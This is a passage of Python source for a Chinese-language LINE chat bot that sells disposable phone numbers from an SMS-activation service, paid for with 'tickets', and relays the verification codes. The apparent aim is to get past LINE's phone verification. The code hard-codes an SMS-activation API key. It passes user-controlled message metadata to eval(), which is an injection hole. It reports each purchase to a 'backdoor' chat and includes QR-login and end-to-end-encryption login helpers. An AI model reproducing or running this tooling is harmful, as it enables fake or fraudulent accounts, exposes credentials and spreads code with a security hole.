                              cl.relatedMessage(to, "權限全清成功",msg_id) 
                           else:
                              pass
                        elif cmd.startswith("簡訊機加作者 "):
                            if sender in akane:
                                MENTION = eval(msg.contentMetadata['MENTION'])
                                MENTION['MENTIONEES'][0]["M"]
                                suc = []
                                fail = [] 
                                for x in MENTION['MENTIONEES']:
                                    if x["M"] not in ban["creator"] and x["M"] not in ban["blacklist"]:
                                        ban["creator"].append(x["M"])
                                        suc.append(x["M"])
                                        backupData()
                                    else:
                                        fail.append(x["M"])
                                lover = "[成功增加權限]"
                                no = 0
                                for x in suc:
                                     no+=1
                                     lover +=  "\n"+f"{str(no)}." + f"{cl.getContact(x).displayName}"
                                if no == 0:
                                    lover+= "\n • 無名單" 
                                no = 0
                                lover += "\n[增加權限失敗]"
                                for a in fail:
                                      no+=1
                                      lover += "\n" +f"{str(no)}."+f"{cl.getContact(a).displayName} "
                                if no == 0:
                                    lover+= "\n • 無名單"
                                cl.sendMessage(to, lover)
                        elif cmd.startswith("簡訊機刪作者 "):
                            if sender in akane:
                                MENTION = eval(msg.contentMetadata['MENTION'])
                                MENTION['MENTIONEES'][0]["M"]
                                suc = []
                                fail = [] 
                                for x in MENTION['MENTIONEES']:
                                    if x["M"] in ban["creator"] and x["M"] not in akane:
                                        ban["creator"].remove(x["M"])
                                        suc.append(x["M"])
                                        backupData()
                                    else:
                                        fail.append(x["M"])
                                lover = "[成功刪除權限]"
                                no = 0
                                for x in suc:
                                     no+=1
                                     lover +=  "\n"+f"{str(no)}." + f"{cl.getContact(x).displayName}"
                                if no == 0:
                                    lover+= "\n • 無名單" 
                                no = 0
                                lover += "\n[刪除權限失敗]"
                                for a in fail:
                                      no+=1
                                      lover += "\n" +f"{str(no)}."+f"{cl.getContact(a).displayName} "
                                if no == 0:
                                    lover+= "\n • 無名單"
                                cl.sendMessage(to, lover) 
                    if sender in sender:
                        if cmd == '取得信箱':
                          if notext["swich"] == False:
                             getmail(to,msg_id, sender) 
                             if notext["swich"] == False:
                                  Thread(target=stop).start()
                        if cmd == 'mymid':
                          if notext["swich"] == False:
                            cl.relatedMessage(to,sender,msg_id)
                            if notext["swich"] == False:
                               Thread(target=stop).start()
                        if cmd.startswith('釋放:'):
                         print("檢查3") 
                         if sender not in clMID:
                             nid = text[3:]
                             candata = requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'setStatus','status': '8','id': nid}).text
                             if candata == 'ACCESS_CANCEL':
                                 del wait["akanesms"][nid]
                                 cl.relatedMessage(to,"釋放完成",msg_id)
                             else:
                               cl.relatedMessage(to,"釋放失敗",msg_id)
                        elif cmd.startswith("qr "):
                            txt = text[3:]
                            myqr.run(
                                 words=txt,
                                 version=1,
                                 level='L',
                                 colorized=True ,
                                 picture='test.gif',#你要的背景檔名
                                 contrast=1.0,
                                 brightness=1.0,
                                 save_name='a.gif',#記得改gif
                            )
                            cl.sendGIF(to, "a.gif")#記得改gif
                            os.remove("a.gif")#記得改gif
                        elif text == 'cvplogin':
                            a = CHRLINE2(device="DESKTOPMAC", noLogin=True)
                            for b in a.requestSQR():
                                try:
                                   cl.sendReplyMessage(msg_id,to,"@akanesmsbot {}".format(str(b)), contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                                   cl.sendImage(to, "vp.jpg")
                                   os.remove("vp.jpg")
                                except:
                                   pass
                        elif text == '解e2ee':
                            a = CHRLINE4(device="DESKTOPMAC", noLogin=True)
                            for b in a.requestSQR():
                                try:
                                   cl.sendReplyMessage(msg_id,to,"@akanesmsbot {}".format(str(b)), contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                                   cl.sendImage(to, "e2ee.png")                                  
                                   os.remove("e2ee.png")
                                except:traceback.print_exc()
                        elif text == 'login':
                            a = CHRLINE(device="DESKTOPMAC", noLogin=True)
                            for b in a.requestSQR():
                                try:
                                   cl.sendReplyMessage(msg_id,to,"@akanesmsbot {}".format(str(b)), contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                                   cl.sendImage(to, "a.jpg")
                                   os.remove("a.jpg")
                                except:
                                   pass
                        elif cmd == 'gc':
                           if sender in sender and notext["swich"] == False:
                            if sender in ban["creator"]:
                                cl.sendReplyMessage(msg_id, to, "@akanesmsbot 尼是作者♡", contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                            elif sender in users['user']:
                                if users['user'][sender] > 0:
                                    cl.sendReplyMessage(msg_id, to, "@akanesmsbot 還剩下{} 票".format(str(users['user'][sender])), contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                                    if notext["swich"] == False:
                                        Thread(target=stop).start()
                                else:
                                   a = cl.sendReplyMessage(msg_id, to, "@akanesmsbot 沒有票惹\n 買票私以下連結或友資(｡･ω･｡)\nline.me/ti/p/~sa0106sa0106sa0106", contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                                   cl.sendReplyContact(a.id,to,"u4b0dcd14833631c06783ae2df41df2f4")
                                   if notext["swich"] == False:
                                         Thread(target=stop).start()
                            else:
                                b = cl.sendReplyMessage(msg_id, to, "@akanesmsbot 沒有票惹\n 買票私以下連結或友資(｡･ω･｡)\nline.me/ti/p/~sa0106sa0106sa0106", contentMetadata={'MENTION':'{"MENTIONEES":[{"S":"0","E":"12","M":'+json.dumps(sender)+'}]}'}, contentType=0)
                                cl.sendReplyContact(b.id,to,"u4b0dcd14833631c06783ae2df41df2f4")
                                if notext["swich"] == False:
                                    Thread(target=stop).start()
                        elif cmd == 't':
                            # 創建 SMSActivateAPI 對象，傳入 API 金鑰
                            api = SMSActivateAPI(api_key="7ef7471dB3ef6BBfecef84f19c34e302")
                            def response(self, action, response):
                                self.__debugLog(response)
                                # 檢查回應是否為空
                                if not response:return {"error": "empty_response", "message": "Empty response received"}

                                if self.check_error(response):return {"error": response, "message": self.get_error(response)}

                                if action == "getNumber":
                                    try:
                                        response_data = response.split(":")
                                        activation_id = int(response_data[0])
                                        phone = int(response_data[1])
                                        return {"activation_id": activation_id, "phone": phone}
                                    except ValueError:
                                        return {"error": "invalid_response", "message": "Invalid response format"}

# 使用 getNumber 方法獲取號碼
                            response = api.getNumber(service="me", country="52",freePrice='true',maxPrice="true")

# 解析 response，獲取號碼和激活 ID
                            if "error" in response:print("錯誤：", response["message"])
                            else:
                                activation_id = response["activation_id"]
                                phone_number = response["phone"]
                                print("獲取的號碼：", phone_number)
                                print("激活 ID：", activation_id)
                        elif cmd == '搶劫':
                                  srced = sms["service"];ctced = sms["country"];price = sms["countries"][ctced]["price"][srced]
                                  if sender not in ban["creator"]:
                                        if sender in "u4b0dcd14833631c06783ae2df41df2f4" :
                                           return
                                        else:
                                          if int(users['user'][sender]) > 0:
                                            if users['user'][sender] >= price:
                                                users['user'][sender] -= price;backupData()
                                                ct = "本次簡訊接收國家為:\n";ct += sms["countries"][ctced]["name"]
                                                cl.relatedMessage(to,str(ct),msg_id)
                                                ord = requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'getNumber','service':srced, 'country' :ctced, 'forward' : 0, 'operator' : null, 'ref' :null,'freePrice' : false,'maxPrice':true}).text
                                                print(ord)
                                                if 'ACCESS_NUMBER' in ord:
                                                    ord = ord.split(':')
                                                    ordid = ord[1]
                                                    ordphone = ord[2]
                                                    if '+' not in ordphone:
                                                        ordphone = '+' + ordphone
                                                    cl.relatedMessage(to,str(ordphone),msg_id);cl.relatedMessage(to,"釋放:"+str(ordid),msg_id);cl.sendMessage(backdoor, "有人取得號碼\n國家:" +sms["countries"][ctced]["name"]+"\n使用者:"+cl.getContact(sender).displayName+"\n號碼id:"+str(ordid)) 
                                                    wait["akanesms"][ordid] = True
                                                    try:
                                                        requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'setStatus','status': '1','id': ordid});code = smsgetcode(ordid)
                                                        del wait["akanesms"][ordid]
                                                        cl.relatedMessage(to,str(code),msg_id)
                                                        if sender in ban["creator"]:
                                                            cl.relatedMessage(to,"作者使用無須票卷(｡･ω･｡)",msg_id)
                                                        elif users['user'][sender] < 1:
                                                            del users['user'][sender]
                                                            backupData()
                                                            cl.relatedMessage(to,"您的票卷已全數使用完畢\n歡迎再次購買票卷",msg_id)
                                                        else:
                                                            cl.relatedMessage(to,f"您的{str(price)}張票卷已使用完畢".format(str(price)),msg_id)
                                                    except Exception as e:
                                                        traceback.print_exc()
                                                        if 'timeout' == str(e):
                                                            if sender in ban["creator"]:
                                                                cl.relatedMessage(to,"您未在20分鐘內完成驗證!",msg_id)
                                                            else:
                                                                cl.relatedMessage(to,"您未在20分鐘內完成驗證!\n票數將自動加回",msg_id)
                                                                users[sender] += price
                                                            del wait["akanesms"][ordid]
                                                        elif 'release' == str(e):
                                                            if sender in ban["creator"]:
                                                                cl.relatedMessage(to,"您的號碼已被釋放!",msg_id)
                                                            else:
                                                                cl.relatedMessage(to,"您的號碼已被釋放!\n票數將自動加回",msg_id)
                                                                users['user'][sender] += price
                                                        else:
                                                            if sender in ban["creator"]:
                                                                cl.relatedMessage(to,"接收失敗\n請重試(´･_･`)",msg_id)
                                                            else:
                                                                cl.relatedMessage(to,"接收失敗\n請重試(´･_･`)",msg_id)
                                                                users['user'][sender] += price
                                                            del wait["akanesms"][ordid]
                                                elif 'NO_NUMBERS' == ord:
                                                    if sender in ban["creator"]:
                                                        cl.relatedMessage(to,"該國家已無空號\n請切換國家並再試一次",msg_id)
                                                    else:
                                                        cl.relatedMessage(to,"該國家已無空號\n請切換國家並再試一次\n票數將自動加回",msg_id)
                                                        users['user'][sender] += price
                                                elif 'NO_BALANCE' == ord:
                                                    if sender in ban["creator"]:
                                                        cl.relatedMessage(to,"系統餘額已經用盡",msg_id)
                                                    else:
                                                        cl.relatedMessage(to,"系統餘額已經用盡",msg_id)
                                                        users['user'][sender] += price
                                                else:
                                                    if sender in ban["creator"]:
                                                        cl.relatedMessage(to,"號碼取得失敗!\n請切換國家或再試一次(´･_･`)",msg_id)
                                                    else:
                                                        cl.relatedMessage(to,"號碼取得失敗!\n請切換國家或再試一次(´･_･`)\n票數將自動加回",msg_id)
                                                        users['user'][sender] += price
                                  else:
                                   if sender in ban["creator"]:
                                    ct = "本次簡訊接收國家為:\n"
                                    ct += sms["countries"][ctced]["name"]
                                    cl.relatedMessage(to,str(ct),msg_id)
                                    ord = requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'getNumber','service':srced, 'country' :ctced,'freePrice':'false'}).text
                                    if 'ACCESS_NUMBER' in ord:
                                        ord = ord.split(':')
                                        ordid = ord[1]
                                        ordphone = ord[2]
                                        if '+' not in ordphone:
                                            ordphone = '+' + ordphone
                                        cl.relatedMessage(to,str(ordphone),msg_id)
                                        cl.relatedMessage(to,"釋放:"+str(ordid),msg_id)
                                        cl.sendMessage(backdoor, "有人取得號碼\n國家:" +sms["countries"][ctced]["name"]+"\n使用者:"+cl.getContact(sender).displayName+"\n號碼id:"+str(ordid)) 
                                        wait["akanesms"][ordid] = True
                                        try:
                                            requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'setStatus','status': '1','id': ordid})
                                            code = smsgetcode(ordid)
                                            del wait["akanesms"][ordid]
                                            cl.relatedMessage(to,str(code),msg_id)
                                            if sender in ban["creator"]:
                                                cl.relatedMessage(to,"作者使用無須票卷(｡･ω･｡)",msg_id)
                                            elif users['user'][sender] < 1:
                                                del users['user'][sender]
                                                backupData()
                                                cl.relatedMessage(to,"您的票卷已全數使用完畢\n歡迎再次購買票卷",msg_id)
                                            else:
                                                cl.relatedMessage(to,"您的{}張票卷已使用完畢".format(str(price)),msg_id)
                                        except Exception as e:
                                            if 'timeout' == str(e):
                                                if sender in ban["creator"]:
                                                    cl.relatedMessage(to,"您未在20分鐘內完成驗證!",msg_id)
                                                else:
                                                    cl.relatedMessage(to,"您未在20分鐘內完成驗證!\n票數將自動加回",msg_id)
                                                    users[sender] += price
                                                del wait["akanesms"][ordid]
                                            elif 'release' == str(e):
                                                if sender in ban["creator"]:
                                                    cl.relatedMessage(to,"您的號碼已被釋放!",msg_id)
                                                else:
                                                    cl.relatedMessage(to,"您的號碼已被釋放!\n票數將自動加回",msg_id)
                                                    users['user'][sender] += price
                                            else:
                                                if sender in ban["creator"]:
                                                    cl.relatedMessage(to,"接收失敗\n請重試(´･_･`)",msg_id)
                                                else:
                                                    cl.relatedMessage(to,"接收失敗\n請重試(´･_･`)",msg_id)
                                                    users['user'][sender] += price
                                                del wait["akanesms"][ordid]
                                    elif 'NO_NUMBERS' == ord:
                                        if sender in ban["creator"]:
                                            cl.relatedMessage(to,"該國家已無空號\n請切換國家並再試一次",msg_id)
                                        else:
                                            cl.relatedMessage(to,"該國家已無空號\n請切換國家並再試一次\n票數將自動加回",msg_id)
                                            users['user'][sender] += price
                                    elif 'NO_BALANCE' == ord:
                                        if sender in ban["creator"]:
                                            cl.relatedMessage(to,"系統餘額已經用盡",msg_id)
                                        else:
                                            cl.relatedMessage(to,"系統餘額已經用盡",msg_id)
                                            users['user'][sender] += price
                                    else:
                                        traceback.print_exc()
                                        if sender in ban["creator"]:
                                            cl.relatedMessage(to,"號碼取得失敗!\n請切換國家或再試一次(´･_･`)",msg_id)
                                        else:
                                            cl.relatedMessage(to,"號碼取得失敗!\n請切換國家或再試一次(´･_･`)\n票數將自動加回",msg_id)
                                            users['user'][sender] += price
                        elif cmd.startswith('國家:'):
                                    wcts = int(text[3:]);targets = [];
                                    for chs in sms["countries"]:
                                        targets.append(chs)
                                    wcts -= 1
                                    target = targets[wcts]
                                    sms["country"] = target
                                    arr = []
                                    text_ = '【國家更換通知】\n • '
                                    mention = "@x "
                                    slen = str(len(text_))
                                    elen = str(len(text_) + len(mention) - 1)
                                    arrData = {'S':slen, 'E':elen, 'M':sender}
                                    arr.append(arrData)
                                    text_ += mention + " \n切換國家為\n⇛【%s】"% sms["countries"][target]["name"]
                                    cl.sendReplyMessage(msg_id,to,text_, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
                        elif cmd == '目前國家':
                                ct =  "目前設定國家為\n⇛" + sms["countries"][sms["country"]]["name"]
                                ord = requests.get(sms["base_url"], params={'api_key': sms["apikey"],'action': 'getNumbersStatus','country': sms["country"]}).json()
                                if sms["service"] + "_0" in ord:
                                    ct += "\n目前line空號量: " + str(ord[sms["service"] + "_0"]) + "隻"
                                else:
                                    ct += "\n目前line空號量: " + str(ord[sms["service"] + "_1"]) + "隻"
                                cl.relatedMessage(to,str(ct),msg_id)
                        elif text.lower() == "誰回我":
                           if os.path.isfile("returns/"+str(sender)+".json"):
                               Who_returns_to_me = json.load(codecs.open("returns/"+str(sender)+".json","r","utf-8"))
                               if to in Who_returns_to_me:
                                   tagnum = len(Who_returns_to_me[to])
                                   try:
                                       qwe="上一位回覆者】\n"
                                       qwe+=cl.getContact(str(Who_returns_to_me[to][str(tagnum)]["sender"])).displayName+"\n"
                                       qwe+="時間："+str(Who_returns_to_me[to][str(tagnum)]["tagtime"])
                                       qwe+="\n剩餘查詢次數："+str(tagnum-1)
                                       cl.relatedMessage(msg.to, str(qwe),Who_returns_to_me[to][str(tagnum)]["msgid"])
                                       del Who_returns_to_me[to][str(tagnum)]
                                       json.dump(Who_returns_to_me, codecs.open('returns/'+str(sender)+'.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
                                   except Exception as e:print(e)
                               else:pass
                           else:pass
                        elif text.lower() == "誰標我":
                           if os.path.isfile("tag/"+str(sender)+".json"):
                               Who_mark_me = json.load(codecs.open("tag/"+str(sender)+".json","r","utf-8"))
                               if to in Who_mark_me:
                                   tagnum = len(Who_mark_me[to])
                                   try:
                                       contact = cl.getContact(str(Who_mark_me[to][str(tagnum)]["sender"]))
                                       qwe="上一位標註者\n"
                                       qwe+=cl.getContact(str(Who_mark_me[to][str(tagnum)]["sender"])).displayName+"\n"
                                       qwe+="時間："+str(Who_mark_me[to][str(tagnum)]["tagtime"])
                                       qwe+="\n剩餘查詢次數："+str(tagnum-1)
                                       cl.relatedMessage(msg.to, str(qwe),Who_mark_me[to][str(tagnum)]["msgid"])
                                       del Who_mark_me[to][str(tagnum)]
                                       json.dump(Who_mark_me, codecs.open('tag/'+str(sender)+'.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
                                   except:pass
                        elif cmd == '國家列表':
                            ret_ = "【國家列表】"
                            no = 0
                            for cts in sms["countries"]:
                                    no += 1
                                    ret_ += "\n[%s]%s" % (no,sms["countries"][cts]["name"])
                            ret_ += "\n【共%s個國家可使用】" % no
                            cl.relatedMessage(to,ret_,msg_id)
                        elif cmd in ['簡訊機掰掰', '臣退了'] :
                            if to in backdoor:
                                cl.relatedMessage(to,"無法將機器退出後臺",msg_id)
                            else:
                                if msg.toType == 1:
                                    cl.relatedMessage(to,"不如這次就還你自由\n不如擦肩而過別回頭... ",msg_id)
                                    cl.leaveRoom(to)
                                elif msg.toType == 2:
                                    cl.relatedMessage(to,"不如這次就還你自由\n不如擦肩而過別回頭... ",msg_id)
                                    cl.leaveGroup(to)
                        elif cmd == 'help':
                           if sender not in ban["creator"] and notext["swich"] == False:
                              f = open('help1.txt','r',encoding="utf-8");h1 = f.read();f.close()
                              cl.relatedMessage(to,h1,op.message.id)
                              if notext["swich"] == False:
                                  Thread(target=stop).start()
            else:pass
    except:traceback.print_exc()
while 1:
        try:
            ops = oepoll.singleTrace(count=10000)
            if ops is not None:
                for op in ops:
                    oepoll.setRevision(op.revision)
                    thread = Thread(target=smsbot, args=(op,))
                    thread.start()
        except:traceback.print_exc()